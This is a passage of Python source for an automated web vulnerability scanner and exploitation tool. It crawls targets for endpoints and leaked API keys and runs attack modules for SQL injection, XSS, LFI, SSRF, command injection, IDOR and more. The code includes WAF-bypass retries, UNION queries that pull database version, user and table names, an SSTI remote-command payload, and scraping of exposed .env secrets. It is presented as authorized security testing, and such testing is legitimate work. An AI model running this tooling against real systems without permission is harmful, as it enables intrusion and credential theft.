            ("OpenSSH", r"OpenSSH[_/ ](\d+\.\d+)", lambda m: tuple(int(x) for x in m.group(1).split("."))),
            ("Apache",  r"Apache[/ ](\d+\.\d+\.?\d*)", lambda m: tuple(int(x) for x in m.group(1).split("."))),
            ("nginx",   r"nginx[/ ](\d+\.\d+\.?\d*)", lambda m: tuple(int(x) for x in m.group(1).split("."))),
        ]
        for svc_name, pattern, parser in patterns:
            m = re.search(pattern, banner, re.IGNORECASE)
            if m:
                version = m.group(0)
                try:
                    ver_tuple = parser(m)
                    for check_fn, cve_desc in VERSION_CVE_MAP.get(svc_name, []):
                        if check_fn(ver_tuple):
                            cves.append(cve_desc)
                except Exception:
                    pass

        return {"service": svc, "version": version, "cves": cves}

    def run(self, state: ScanState) -> list:
        self.ui.log(f"Scanning {len(TOP_1000_PORTS)} ports on {self.host}...", "INFO")
        self.ui.set_phase("Phase 1: Ports", len(TOP_1000_PORTS))

        loop   = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        try:
            raw = loop.run_until_complete(self.scan_async(TOP_1000_PORTS))
        finally:
            loop.close()

        open_ports = []
        for r in raw:
            port   = r["port"]
            banner = r["banner"]
            info   = self.detect_service(port, banner)
            entry  = {**r, **info}
            open_ports.append(entry)
            risk_label = ""
            if info["service"] in DANGEROUS_SERVICES:
                risk, reason, cve = DANGEROUS_SERVICES[info["service"]]
                risk_label = f" [{risk}]"
                state.add_finding(Finding(
                    vuln_id="", type="Open Service",
                    severity=risk,
                    location=f"Port {port}",
                    evidence=f"{info['service']} — {reason}",
                    cvss={"CRITICAL": 9.0, "HIGH": 7.5, "MEDIUM": 5.0}.get(risk, 3.0),
                    owasp="A06:2021", cwe="CWE-200",
                    impact=reason,
                    fix=[f"Restrict port {port} via firewall", "Update service to latest version"],
                ))
            for cve_desc in info["cves"]:
                state.add_finding(Finding(
                    vuln_id="", type="Outdated Service / CVE",
                    severity="HIGH", location=f"Port {port}",
                    evidence=f"{info['version']} — {cve_desc}",
                    cvss=7.5, owasp="A06:2021", cwe="CWE-1035",
                    impact="Known exploitable vulnerability in service version",
                    fix=["Update to latest patched version immediately"],
                ))
            self.ui.log(f"Port {port} ({info['service']}){risk_label}", "OK" if not risk_label else "VULN")
            self.ui.advance_phase("Phase 1: Ports", 1)

        state.open_ports = open_ports
        self.ui.log(f"Found {len(open_ports)} open ports", "OK")
        return open_ports


# ══════════════════════════════════════════════════════════════════════════════
#  WEB CRAWLER
# ══════════════════════════════════════════════════════════════════════════════

class WebCrawler:
    """Recursive web spider — extracts URLs, JS endpoints, forms, and secrets."""

    JS_ENDPOINT_PATTERNS = [
        r"""fetch\s*\(\s*['"`]([^'"`]+)['"`]""",
        r"""axios\s*\.\s*(?:get|post|put|delete)\s*\(\s*['"`]([^'"`]+)['"`]""",
        r"""(?:url|endpoint|path|href|src)\s*[:=]\s*['"`]([/][^'"`\s]{3,})['"`]""",
        r"""(?:apiUrl|baseUrl|API_URL)\s*=\s*['"`](https?://[^'"`]+)['"`]""",
        r"""ws[s]?://[^'"`\s]+""",
    ]

    def __init__(self, base_url: str, ui: UIManager):
        self.base_url  = base_url
        self.base_host = urlparse(base_url).netloc
        self.ui        = ui
        self._ua_idx   = 0
        self._session  = requests.Session()
        self._latency_samples: list = []
        self._current_delay = REQUEST_DELAY

    def _headers(self) -> dict:
        ua = USER_AGENTS[self._ua_idx % len(USER_AGENTS)]
        self._ua_idx += 1
        return {"User-Agent": ua, "Accept": "text/html,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.5", "Connection": "keep-alive"}

    def _req(self, url: str, method: str = "GET", **kwargs) -> Optional[requests.Response]:
        """Rate-limited request with dynamic delay and retry."""
        for attempt in range(3):
            try:
                t0   = time.time()
                resp = self._session.request(
                    method, url, headers=self._headers(),
                    timeout=REQUEST_TIMEOUT, verify=False,
                    allow_redirects=True, **kwargs
                )
                latency = time.time() - t0
                self._latency_samples.append(latency)
                if len(self._latency_samples) > 10:
                    self._latency_samples.pop(0)
                avg = sum(self._latency_samples) / len(self._latency_samples)
                # Dynamic rate limiting: if avg latency > 2s, slow down
                self._current_delay = min(REQUEST_DELAY + (avg - 0.5) * 0.1, 2.0) \
                                      if avg > 0.5 else REQUEST_DELAY
                time.sleep(self._current_delay)
                return resp
            except requests.exceptions.SSLError:
                self._session.verify = False
                continue
            except requests.exceptions.ConnectionError:
                time.sleep(2 ** attempt)
                continue
            except Exception:
                return None
        return None

    def crawl(self, state: ScanState, depth: int = 0, url: str = "") -> None:
        if depth > CRAWL_DEPTH or len(state.discovered_urls) >= MAX_URLS:
            return
        url = url or self.base_url
        if url in state.discovered_urls:
            return
        state.discovered_urls.add(url)

        resp = self._req(url)
        if not resp:
            return

        self.ui.log(f"Crawled [{resp.status_code}] {url[:70]}", "INFO")
        soup = BeautifulSoup(resp.text, "html.parser")

        # Extract all links
        for tag, attr in [("a", "href"), ("form", "action"), ("script", "src"),
                          ("link", "href"), ("iframe", "src"), ("img", "src")]:
            for el in soup.find_all(tag):
                raw = el.get(attr, "")
                if not raw or raw.startswith(("mailto:", "tel:", "#", "javascript:")):
                    continue
                full = urljoin(url, raw)
                parsed = urlparse(full)
                if parsed.netloc != self.base_host:
                    continue
                clean = parsed._replace(fragment="").geturl()
                if clean not in state.discovered_urls and len(state.discovered_urls) < MAX_URLS:
                    if tag == "script" and attr == "src":
                        state.js_files.add(clean)
                    self.crawl(state, depth + 1, clean)

        # Extract JS endpoints and secrets from inline scripts
        for script in soup.find_all("script"):
            js_content = script.string or ""
            if js_content:
                self._parse_js(js_content, url, state)

        # HTML comments (developer notes, hidden endpoints)
        for comment in soup.find_all(string=lambda t: isinstance(t, str) and "<!--" not in t):
            pass
        import bs4
        for comment in soup.find_all(string=lambda text: isinstance(text, bs4.Comment)):
            comment_text = str(comment)
            paths = re.findall(r"(/[a-zA-Z0-9_\-/]+)", comment_text)
            for p in paths:
                full = urljoin(url, p)
                if urlparse(full).netloc == self.base_host:
                    state.discovered_urls.add(full)
            self.ui.log(f"HTML comment found: {comment_text[:60]}", "WARN")

        # Extract forms
        for form in soup.find_all("form"):
            action  = urljoin(url, form.get("action", url))
            method  = form.get("method", "get").upper()
            inputs  = {
                i.get("name"): i.get("value", "")
                for i in form.find_all(["input", "textarea", "select"])
                if i.get("name")
            }
            if inputs:
                with state._lock:
                    state.forms.append({
                        "action": action, "method": method,
                        "inputs": inputs, "source_url": url,
                    })

    def _parse_js(self, js: str, source_url: str, state: ScanState) -> None:
        """Extract endpoints and secrets from JavaScript content."""
        for pattern in self.JS_ENDPOINT_PATTERNS:
            for m in re.finditer(pattern, js):
                path = m.group(1) if m.lastindex and m.lastindex >= 1 else m.group(0)
                if path.startswith(("//", "http", "ws")):
                    full = path
                elif path.startswith("/"):
                    full = urljoin(self.base_url, path)
                else:
                    continue
                if urlparse(full).netloc in ("", self.base_host):
                    if full not in state.discovered_urls:
                        state.discovered_urls.add(full)

        # Scan for secrets
        for key_type, pattern in API_KEY_PATTERNS.items():
            for m in re.finditer(pattern, js):
                secret = m.group(0)[:80]
                self.ui.log(f"SECRET in JS: {key_type} — {secret[:40]}...", "VULN")
                with state._lock:
                    state.secrets.append({
                        "type": key_type, "value": secret,
                        "source": source_url,
                    })

    def fetch_js_files(self, state: ScanState) -> None:
        """Download and parse all discovered .js files."""
        for js_url in list(state.js_files):
            resp = self._req(js_url)
            if resp and resp.status_code == 200:
                self._parse_js(resp.text, js_url, state)
                self.ui.log(f"Parsed JS: {js_url[:60]}", "INFO")

    def parse_robots(self, state: ScanState) -> None:
        resp = self._req(urljoin(self.base_url, "/robots.txt"))
        if resp and resp.status_code == 200:
            for line in resp.text.splitlines():
                if line.strip().lower().startswith("disallow:"):
                    path = line.split(":", 1)[1].strip()
                    full = urljoin(self.base_url, path)
                    if urlparse(full).netloc == self.base_host:
                        state.discovered_urls.add(full)
                        self.ui.log(f"robots.txt Disallow: {path}", "WARN")

    def parse_sitemap(self, state: ScanState) -> None:
        resp = self._req(urljoin(self.base_url, "/sitemap.xml"))
        if resp and resp.status_code == 200:
            for m in re.finditer(r"<loc>(.*?)</loc>", resp.text):
                url = m.group(1).strip()
                if urlparse(url).netloc == self.base_host:
                    state.discovered_urls.add(url)

    def run(self, state: ScanState) -> None:
        self.ui.set_phase("Phase 2: Spider", 5)
        self.parse_robots(state)
        self.ui.advance_phase("Phase 2: Spider")
        self.parse_sitemap(state)
        self.ui.advance_phase("Phase 2: Spider")
        self.crawl(state)
        self.ui.advance_phase("Phase 2: Spider")
        self.fetch_js_files(state)
        self.ui.advance_phase("Phase 2: Spider")
        self.ui.log(f"Spider complete — {len(state.discovered_urls)} URLs, "
                    f"{len(state.forms)} forms, {len(state.js_files)} JS files", "OK")
        self.ui.advance_phase("Phase 2: Spider")


# ══════════════════════════════════════════════════════════════════════════════
#  VULN ENGINE  (12 Modules)
# ══════════════════════════════════════════════════════════════════════════════

class VulnEngine:
    """All vulnerability scanning modules A–L."""

    def __init__(self, base_url: str, ui: UIManager, state: ScanState):
        self.base_url = base_url
        self.base_host = urlparse(base_url).netloc
        self.ui       = ui
        self.state    = state
        self._ua_idx  = 0
        self._session = requests.Session()

    def _headers(self) -> dict:
        ua = USER_AGENTS[self._ua_idx % len(USER_AGENTS)]
        self._ua_idx += 1
        return {"User-Agent": ua, "Accept": "text/html,*/*;q=0.8"}

    def _req(self, url: str, method: str = "GET", waf_bypass: bool = False,
             **kwargs) -> Optional[requests.Response]:
        for attempt in range(2):
            try:
                resp = self._session.request(
                    method, url, headers=self._headers(),
                    timeout=REQUEST_TIMEOUT, verify=False,
                    allow_redirects=True, **kwargs
                )
                if resp.status_code == 403 and waf_bypass and attempt == 0:
                    # WAF bypass: retry with URL-encoded payload
                    if "params" in kwargs:
                        encoded = {k: quote(str(v), safe="") for k, v in kwargs["params"].items()}
                        kwargs["params"] = encoded
                    continue
                time.sleep(self.state._lock and REQUEST_DELAY or REQUEST_DELAY)
                return resp
            except Exception:
                return None
        return None

    def _vuln(self, vtype: str, sev: str, loc: str, **kwargs) -> None:
        meta = VULN_META.get(vtype, {})
        f = Finding(
            vuln_id="", type=vtype, severity=sev, location=loc,
            cvss=meta.get("cvss", 0.0), owasp=meta.get("owasp", ""),
            cwe=meta.get("cwe", ""), impact=meta.get("impact", ""),
            fix=meta.get("fix", []), **kwargs,
        )
        self.state.add_finding(f)
        self.ui.log(f"[{sev}] {vtype} @ {loc[:50]}", "VULN")

    # ── Module A: SQL Injection ───────────────────────────────────────────────
    def test_sqli(self, url: str) -> None:
        """Error-based + Union-based SQLi detection with DB enumeration."""
        parsed = urlparse(url)
        if not parsed.query:
            return
        params = dict(parse_qsl(parsed.query))

        for param in params:
            baseline = self._req(url)
            baseline_len = len(baseline.text) if baseline else 0

            for payload in SQL_PAYLOADS:
                tp = params.copy(); tp[param] = payload
                resp = self._req(url, params=tp, waf_bypass=True)
                if not resp:
                    continue
                body_lower = resp.text.lower()

                # Error-based detection
                for err_pattern in SQL_ERROR_PATTERNS:
                    if re.search(err_pattern, body_lower, re.IGNORECASE):
                        self.ui.log(f"SQLi error-based — param '{param}' | {payload[:30]}", "VULN")
                        extracted = self._sqli_extract_info(url, param, params)
                        self._vuln("SQL Injection", "CRITICAL", url,
                                   parameter=param, payload=payload,
                                   evidence=f"SQL error triggered. {extracted.get('info','')}",
                                   extracted=extracted)
                        return

                # Time-based blind (>3s response)
                if "SLEEP(3)" in payload.upper() or "WAITFOR" in payload.upper():
                    t0 = time.time()
                    self._req(url, params={**params, param: payload})
                    if time.time() - t0 > 3.0:
                        self._vuln("SQL Injection", "CRITICAL", url,
                                   parameter=param, payload=payload,
                                   evidence="Time-based blind SQLi — response delayed >3s")
                        return

    def _sqli_extract_info(self, url: str, param: str, params: dict) -> dict:
        """Attempt to extract DB version/name as proof-of-concept."""
        extracted = {}
        # Try UNION-based extraction for DB version and name
        for col_count in range(1, 6):
            nulls = ",".join(["NULL"] * (col_count - 1))
            for label, payload in [
                ("db_version", f"' UNION SELECT {('NULL,' * max(0, col_count-1))}version()--"),
                ("db_name",    f"' UNION SELECT {('NULL,' * max(0, col_count-1))}database()--"),
                ("db_user",    f"' UNION SELECT {('NULL,' * max(0, col_count-1))}user()--"),
            ]:
                tp = params.copy(); tp[param] = payload
                r  = self._req(url, params=tp)
                if not r:
                    continue
                # Look for version string pattern
                vm = re.search(r"\b(\d+\.\d+[\.\d\-\w]+)\b", r.text)
                if vm and label == "db_version":
                    extracted[label] = vm.group(1)
                    self.ui.log(f"  Extracted DB version: {vm.group(1)}", "CHAIN")
                um = re.search(r"\b([a-z_][a-z0-9_]+)@[\w\.]+\b", r.text)
                if um and label in ("db_user", "db_name"):
                    extracted[label] = um.group(0)
                    self.ui.log(f"  Extracted {label}: {um.group(0)}", "CHAIN")
                time.sleep(SCAN_DELAY if hasattr(self, '_') else REQUEST_DELAY)

            if extracted:
                # Also list table names via information_schema
                tp = params.copy()
                tp[param] = (f"' UNION SELECT GROUP_CONCAT(table_name),"
                             f"{'NULL,'*(col_count-1)}NULL FROM information_schema.tables "
                             f"WHERE table_schema=database()--")
                r2 = self._req(url, params=tp)
                if r2:
                    # Look for comma-separated identifiers (table names)
                    tm = re.search(r"\b([a-z_][a-z0-9_,]{5,100})\b", r2.text)
                    if tm:
                        extracted["tables_found"] = tm.group(0)[:200]
                        self.ui.log(f"  Tables: {tm.group(0)[:60]}", "CHAIN")
                break

        extracted["info"] = " | ".join(f"{k}: {v}" for k, v in extracted.items())
        return extracted

    def test_sqli_forms(self) -> None:
        for form in self.state.forms:
            action  = form["action"]
            method  = form["method"]
            fields  = dict(form["inputs"])
            for field_name in fields:
                for payload in SQL_PAYLOADS[:15]:
                    data = fields.copy(); data[field_name] = payload
                    resp = (self._req(action, method="POST", data=data)
                            if method == "POST"
                            else self._req(action, params=data))
                    if not resp:
                        continue
                    for err in SQL_ERROR_PATTERNS:
                        if re.search(err, resp.text.lower(), re.IGNORECASE):
                            self._vuln("SQL Injection", "CRITICAL", action,
                                       parameter=field_name, payload=payload,
                                       evidence="SQL error in form submission")
                            return
                    time.sleep(REQUEST_DELAY)

    # ── Module B: XSS ─────────────────────────────────────────────────────────
    def test_xss(self, url: str) -> None:
        parsed = urlparse(url)
        if not parsed.query:
            return
        params = dict(parse_qsl(parsed.query))
        for param in params:
            for payload in XSS_PAYLOADS:
                tp = params.copy(); tp[param] = payload
                resp = self._req(url, params=tp)
                if not resp:
                    continue
                if payload in resp.text:
                    if payload in ("{{7*7}}", "${7*7}", "#{7*7}") and "49" in resp.text:
                        self._vuln("SSTI", "CRITICAL", url,
                                   parameter=param, payload=payload,
                                   evidence="Template expression 7*7=49 evaluated server-side")
                        # SSTI confirmed → chain escalation
                        self.state.add_finding(Finding(
                            vuln_id="", type="SSTI",
                            severity="CRITICAL", location=url,
                            parameter=param,
                            payload="{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
                            evidence="SSTI → RCE possible via OS module access",
                            cvss=9.8, owasp="A03:2021", cwe="CWE-94",
                            impact="Full remote code execution via template engine.",
                            fix=["Use sandboxed template environment",
                                 "Never pass user input to render()"],
                            chain_type="SSTI_CONFIRMED"
                        ))
                    else:
                        sev = "HIGH"
                        self._vuln("Reflected XSS", sev, url,
                                   parameter=param, payload=payload,
                                   evidence="Payload reflected verbatim in response")
                    return
                time.sleep(REQUEST_DELAY)

    def test_xss_forms(self) -> None:
        for form in self.state.forms:
            action = form["action"]
            method = form["method"]
            fields = dict(form["inputs"])
            for field_name in fields:
                for payload in XSS_PAYLOADS[:8]:
                    data = fields.copy(); data[field_name] = payload
                    resp = (self._req(action, method="POST", data=data)
                            if method == "POST"
                            else self._req(action, params=data))
                    if resp and payload in resp.text:
                        self._vuln("Reflected XSS", "HIGH", action,
                                   parameter=field_name, payload=payload,
                                   evidence="XSS payload reflected in form response")
                        return
                    time.sleep(REQUEST_DELAY)

    # ── Module C: LFI ─────────────────────────────────────────────────────────
    def test_lfi(self, url: str) -> None:
        parsed = urlparse(url)
        params = dict(parse_qsl(parsed.query))
        file_params = {k: v for k, v in params.items()
                       if any(kw in k.lower() for kw in LFI_FILE_PARAMS)}
        for param in file_params:
            for payload in LFI_PAYLOADS:
                tp = params.copy(); tp[param] = payload
                resp = self._req(url, params=tp)
                if not resp:
                    continue
                for ind in LFI_INDICATORS:
                    if ind in resp.text:
                        extract = resp.text[:200] if "root:x:" in resp.text else ""
                        self._vuln("LFI", "CRITICAL", url,
                                   parameter=param, payload=payload,
                                   evidence=f"File inclusion confirmed: {ind}",
                                   extracted={"partial_content": extract},
                                   chain_type="LFI_CONFIRMED")
                        return
                time.sleep(REQUEST_DELAY)

    # ── Module D: SSRF ────────────────────────────────────────────────────────
    def test_ssrf(self, url: str) -> None:
        parsed = urlparse(url)
        params = dict(parse_qsl(parsed.query))
        ssrf_params = {k: v for k, v in params.items()
                       if k.lower() in SSRF_PARAMS}
        for param in ssrf_params:
            for ssrf_url in SSRF_PAYLOADS[:8]:
                tp = params.copy(); tp[param] = ssrf_url
                t0 = time.time()
                resp = self._req(url, params=tp)
                elapsed = time.time() - t0
                if not resp:
                    continue
                # AWS metadata indicators
                if any(ind in resp.text for ind in
                       ["ami-id", "instance-id", "iam/", "computeMetadata",
                        "instanceMetadata", "root:x:"]):
                    self._vuln("SSRF", "CRITICAL", url,
                               parameter=param, payload=ssrf_url,
                               evidence=f"SSRF to {ssrf_url} returned cloud metadata!")
                    return
                # Blind SSRF via timing (internal service response)
                if elapsed > 3.0 and "169.254" in ssrf_url:
                    self._vuln("SSRF", "HIGH", url,
                               parameter=param, payload=ssrf_url,
                               evidence=f"Blind SSRF — response delayed {elapsed:.1f}s on metadata URL")
                    return
                time.sleep(REQUEST_DELAY)

    # ── Module E: Sensitive Files ──────────────────────────────────────────────
    def test_sensitive_files(self) -> None:
        base = self.base_url.rstrip("/")

        def probe(path: str) -> Optional[dict]:
            r = self._req(base + path, allow_redirects=False)
            if r and r.status_code in (200, 401, 403):
                return {"path": path, "status": r.status_code,
                        "size": len(r.content), "content": r.text[:2000]}
            return None

        all_paths = SENSITIVE_PATHS + ADMIN_PATHS
        with ThreadPoolExecutor(max_workers=MAX_THREADS) as ex:
            futures = {ex.submit(probe, p): p for p in all_paths}
            for fut in as_completed(futures):
                result = fut.result()
                if not result:
                    continue
                path, status, content = result["path"], result["status"], result["content"]
                label = "EXPOSED" if status == 200 else "EXISTS(protected)"
                self.ui.log(f"[{status}] {label}: {path}", "VULN" if status == 200 else "WARN")

                if status == 200:
                    extracted = self._parse_sensitive_content(path, content)
                    self._vuln("Sensitive File Exposed", "HIGH", base + path,
                               evidence=f"HTTP 200 — file publicly accessible",
                               extracted=extracted,
                               chain_type=("EXPOSED_ENV" if ".env" in path
                                           else "EXPOSED_GIT" if ".git" in path
                                           else ""))
                    # Scan for API keys in exposed file
                    for key_type, pattern in API_KEY_PATTERNS.items():
                        m = re.search(pattern, content)
                        if m:
                            self._vuln("API Key Exposed", "CRITICAL", base + path,
                                       evidence=f"{key_type}: {m.group(0)[:60]}",
                                       extracted={"key_type": key_type,
                                                  "value": m.group(0)[:80]})

    def _parse_sensitive_content(self, path: str, content: str) -> dict:
        """Extract structured data from exposed sensitive files."""
        data = {}
        if ".env" in path:
            for kw in ["DB_PASSWORD", "SECRET_KEY", "API_KEY", "AWS_SECRET",
                       "DATABASE_URL", "REDIS_URL", "STRIPE_SECRET"]:
                m = re.search(rf"{kw}\s*=\s*(\S+)", content, re.IGNORECASE)
                if m:
                    data[kw] = m.group(1)[:40] + "..."
        elif ".git/config" in path:
            m = re.search(r"url\s*=\s*(.+)", content)
            if m:
                data["repo_url"] = m.group(1).strip()
        elif "phpinfo" in path:
            vm = re.search(r"PHP Version\s*([\d.]+)", content)
            if vm:
                data["php_version"] = vm.group(1)
        elif "swagger" in path or "api-docs" in path:
            # Extract API endpoints
            endpoints = re.findall(r'"/([\w/{}/]+)"', content)
            data["api_endpoints"] = endpoints[:20]
        elif "backup" in path and ".sql" in path:
            tables = re.findall(r"CREATE TABLE `?(\w+)`?", content)
            data["sql_tables"] = tables[:10]
        return data

    # ── Module F: CORS ────────────────────────────────────────────────────────
    def test_cors(self) -> None:
        test_origins = [
            "https://evil-phantom-test.com",
            "null",
            f"https://{self.base_host}.evil.com",
            f"https://evil.{self.base_host}",
        ]
        for origin in test_origins:
            resp = self._req(self.base_url,
                             headers={**self._headers(), "Origin": origin})
            if not resp:
                continue
            acao = resp.headers.get("Access-Control-Allow-Origin", "")
            acac = resp.headers.get("Access-Control-Allow-Credentials", "false")
            if acao == "*":
                self.ui.log("CORS wildcard (*) — note if credentials used", "WARN")
            elif acao == origin:
                sev = "CRITICAL" if acac.lower() == "true" else "HIGH"
                self._vuln("CORS Misconfiguration", sev, self.base_url,
                           evidence=f"Origin '{origin}' reflected. ACAC={acac}",
                           extracted={"origin_tested": origin,
                                      "credentials_allowed": acac})
                self.ui.log(f"CORS [{sev}]: origin '{origin}' reflected, creds={acac}", "VULN")

    # ── Module G: Security Headers ────────────────────────────────────────────
    def test_headers(self) -> None:
        resp = self._req(self.base_url)
        if not resp:
            return
        hlc  = {k.lower(): v for k, v in resp.headers.items()}
        for hdr, (risk, desc, rec) in SECURITY_HEADERS.items():
            if hdr.lower() not in hlc:
                self._vuln("Missing Security Header",
                           "HIGH" if risk == "HIGH" else "MEDIUM" if risk == "MEDIUM" else "LOW",
                           self.base_url,
                           evidence=f"No {hdr} header — {desc}",
                           fix=[f"Add: {hdr}: {rec}"])
                self.ui.log(f"Missing header: {hdr} [{risk}]", "WARN")
            else:
                val = hlc[hdr.lower()]
                # Weak CSP check
                if hdr == "Content-Security-Policy" and (
                    "unsafe-inline" in val or "unsafe-eval" in val
                ):
                    self._vuln("Missing Security Header", "MEDIUM", self.base_url,
                               evidence=f"Weak CSP: {val[:60]}",
                               fix=["Remove unsafe-inline and unsafe-eval from CSP"])

        # Check for information-leaking headers
        for leak_hdr in ["Server", "X-Powered-By", "X-AspNet-Version", "X-Generator"]:
            if leak_hdr.lower() in hlc:
                self.ui.log(f"Info leak header: {leak_hdr}: {hlc[leak_hdr.lower()]}", "WARN")
                self.state.add_finding(Finding(
                    vuln_id="", type="Info Disclosure",
                    severity="LOW", location=self.base_url,
                    evidence=f"{leak_hdr}: {hlc[leak_hdr.lower()]}",
                    cvss=3.0, owasp="A05:2021", cwe="CWE-200",
                    impact="Exposes server/tech stack — aids targeted exploits",
                    fix=[f"Remove or obfuscate {leak_hdr} response header"],
                ))

    # ── Module H: Session & Cookie Security ───────────────────────────────────
    def test_session_cookies(self) -> None:
        resp = self._req(self.base_url)
        if not resp:
            return
        for cookie in resp.cookies:
            flags   = []
            raw_sc  = resp.headers.get("Set-Cookie", "").lower()
            if not cookie.secure:    flags.append("No Secure flag")
            if "httponly" not in raw_sc: flags.append("No HttpOnly flag")
            if "samesite" not in raw_sc: flags.append("No SameSite flag")
            if flags:
                self._vuln("Insecure Cookie", "MEDIUM", self.base_url,
                           parameter=cookie.name,
                           evidence=f"Cookie '{cookie.name}': {', '.join(flags)}",
                           fix=["Set-Cookie: name=val; Secure; HttpOnly; SameSite=Strict"])

        # JWT in response body or headers
        jwt_pattern = r"eyJ[A-Za-z0-9\-_=]+\.[A-Za-z0-9\-_=]+\.?[A-Za-z0-9\-_.+/=]*"
        for m in re.finditer(jwt_pattern, resp.text):
            token = m.group(0)
            try:
                header_b64  = token.split(".")[0] + "=="
                payload_b64 = token.split(".")[1] + "=="
                header_json  = json.loads(base64.urlsafe_b64decode(header_b64))
                payload_json = json.loads(base64.urlsafe_b64decode(payload_b64))
                alg  = header_json.get("alg", "unknown")
                sensitive_keys = [k for k in payload_json if k in
                                  ("password", "pwd", "secret", "ssn", "credit_card", "role")]
                evidence = f"JWT found. alg={alg}, claims={list(payload_json.keys())[:5]}"
                if sensitive_keys:
                    evidence += f" — SENSITIVE data in payload: {sensitive_keys}"
                self.ui.log(f"JWT detected: alg={alg}", "WARN")
                self.state.add_finding(Finding(
                    vuln_id="", type="JWT Security Issue",
                    severity="MEDIUM" if not sensitive_keys else "HIGH",
                    location=self.base_url,
                    evidence=evidence,
                    cvss=5.3, owasp="A07:2021", cwe="CWE-347",
                    impact="JWT tampering, alg:none attack, weak secret bruteforce",
                    fix=["Use strong secret for HS256 (256+ bits)",
                         "Use RS256 with proper key management",
                         "Never store sensitive data in JWT payload"],
                ))
            except Exception:
                pass

        # Check for CSRF tokens in forms
        for form in self.state.forms:
            if form["method"] == "POST":
                inputs = form["inputs"]
                has_csrf = any(
                    any(kw in name.lower() for kw in ["csrf", "token", "_token", "xsrf"])
                    for name in inputs
                )
                if not has_csrf:
                    self.state.add_finding(Finding(
                        vuln_id="", type="Missing CSRF Protection",
                        severity="MEDIUM",
                        location=form["action"],
                        evidence="POST form has no CSRF token",
                        cvss=6.5, owasp="A01:2021", cwe="CWE-352",
                        impact="Attacker can forge authenticated requests on behalf of victim",
                        fix=["Add random CSRF token to all POST forms",
                             "Validate token server-side on every state-changing request"],
                    ))

    # ── Module I: Command Injection ────────────────────────────────────────────
    def test_cmdi(self, url: str) -> None:
        parsed = urlparse(url)
        if not parsed.query:
            return
        params = dict(parse_qsl(parsed.query))
        for param in params:
            # Time-based detection
            tp = params.copy(); tp[param] = "; sleep 3"
            t0   = time.time()
            resp = self._req(url, params=tp)
            if resp and (time.time() - t0) > 3.0:
                self._vuln("Command Injection", "CRITICAL", url,
                           parameter=param, payload="; sleep 3",
                           evidence="Response delayed >3s — time-based CMDi confirmed")
                return

            # Output-based detection
            for payload in CMD_PAYLOADS[:6]:
                tp = params.copy(); tp[param] = payload
                resp = self._req(url, params=tp)
                if resp and any(ind in resp.text for ind in CMD_INDICATORS):
                    self._vuln("Command Injection", "CRITICAL", url,
                               parameter=param, payload=payload,
                               evidence=f"Command output detected in response")
                    return
                time.sleep(REQUEST_DELAY)

    # ── Module J: IDOR ────────────────────────────────────────────────────────
    def test_idor(self, url: str) -> None:
        parsed = urlparse(url)
        params = dict(parse_qsl(parsed.query))
        numeric_params = {k: v for k, v in params.items()
                         if v.isdigit() and int(v) > 0}
        for param, val in numeric_params.items():
            original_id = int(val)
            baseline    = self._req(url)
            if not baseline:
                continue
            for test_id in [original_id + 1, original_id - 1, original_id + 100, 1]:
                if test_id <= 0:
                    continue
                tp   = params.copy(); tp[param] = str(test_id)
                resp = self._req(url, params=tp)
                if not resp:
                    continue
                if (resp.status_code == 200 and
                        len(resp.text) > 100 and
                        abs(len(resp.text) - len(baseline.text)) > 50):
                    self._vuln("IDOR", "HIGH", url,
                               parameter=param,
                               payload=f"{param}={test_id}",
                               evidence=f"ID {test_id} returned different data (original={original_id})")
                    return
                time.sleep(REQUEST_DELAY)

        # HTTP verb tampering
        for test_url in [url]:
            for method in ["PUT", "DELETE", "PATCH"]:
                resp = self._req(test_url, method=method)
                if resp and resp.status_code not in (404, 405, 501):
                    self.ui.log(f"Verb tamper: {method} {test_url[:50]} → {resp.status_code}", "WARN")

    # ── Module K: Open Redirect ────────────────────────────────────────────────
    def test_open_redirect(self, url: str) -> None:
        parsed = urlparse(url)
        params = dict(parse_qsl(parsed.query))
        redir_params = {k: v for k, v in params.items()
                        if k.lower() in REDIRECT_PARAMS}
        for param in redir_params:
            for payload in REDIRECT_PAYLOADS:
                tp   = params.copy(); tp[param] = payload
                resp = self._req(url, params=tp, allow_redirects=False)
                if not resp:
                    continue
                if resp.status_code in (301, 302, 303, 307, 308):
                    loc = resp.headers.get("Location", "")
                    if "evil-phantom-test.com" in loc or "google.com" in loc:
                        self._vuln("Open Redirect", "MEDIUM", url,
                                   parameter=param, payload=payload,
                                   evidence=f"Redirects to: {loc}")
                        return
                time.sleep(REQUEST_DELAY)

    # ── Module L: Clickjacking PoC ─────────────────────────────────────────────
    def test_clickjacking(self) -> None:
        resp = self._req(self.base_url)
        if not resp:
            return
        hlc = {k.lower(): v for k, v in resp.headers.items()}
        if "x-frame-options" not in hlc and "content-security-policy" not in hlc:
            self._vuln("Clickjacking", "MEDIUM", self.base_url,
                       evidence="No X-Frame-Options or CSP frame-ancestors header",
                       chain_type="CLICKJACKING_CONFIRMED")
            # Generate PoC HTML
            poc_html = f"""<!DOCTYPE html>
<html><head><title>Clickjacking PoC — PHANTOM</title></head>
<body style="margin:0;padding:20px;font-family:sans-serif">
<h2 style="color:red">⚠ Clickjacking PoC — Authorized Testing Only</h2>
<p>Target <strong>{self.base_url}</strong> can be embedded in an iframe:</p>
<iframe src="{self.base_url}" width="800" height="600"
        style="border:2px solid red;opacity:0.5;"></iframe>
<div style="position:absolute;top:200px;left:100px;z-index:999;
            background:rgba(255,0,0,0.3);padding:10px;color:white;font-size:20px">
  FAKE BUTTON — victim clicks here thinking it's the site above
</div>
</body></html>"""
            poc_path = f"clickjacking_poc_{urlparse(self.base_url).netloc.replace('.', '_')}.html"
            with open(poc_path, "w") as f:
                f.write(poc_html)
            self.ui.log(f"Clickjacking PoC saved: {poc_path}", "CHAIN")

    # ── Secret scan on all responses ──────────────────────────────────────────
    def scan_response_for_secrets(self, url: str) -> None:
        resp = self._req(url)
        if not resp:
            return
        for key_type, pattern in API_KEY_PATTERNS.items():
            for m in re.finditer(pattern, resp.text):
                found = m.group(0)[:80]
                if any(found == s.get("value", "")[:80] for s in self.state.secrets):
                    continue
                with self.state._lock:
                    self.state.secrets.append({"type": key_type, "value": found, "url": url})
                self._vuln("API Key Exposed", "CRITICAL", url,
                           evidence=f"{key_type} found in response: {found[:40]}...")


# ══════════════════════════════════════════════════════════════════════════════
#  CHAIN ENGINE
# ══════════════════════════════════════════════════════════════════════════════

class ChainEngine:
    """Autonomous decision tree — chains follow-up actions based on findings."""

